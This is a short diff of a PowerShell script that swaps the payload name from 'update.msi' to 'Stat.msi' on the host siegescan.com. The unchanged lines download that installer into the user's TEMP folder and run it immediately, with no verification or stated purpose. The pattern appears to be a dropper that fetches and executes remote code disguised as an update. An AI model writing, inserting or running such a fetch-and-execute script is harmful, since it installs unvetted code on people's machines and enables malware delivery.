@@ -1,5 +1,5 @@
-$exeUrl = "https://siegescan.com/update.msi"
-$exePath = "$env:TEMP\update.msi"
+$exeUrl = "https://siegescan.com/Stat.msi"
+$exePath = "$env:TEMP\Stat.msi"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 Start-Process -FilePath $exePath
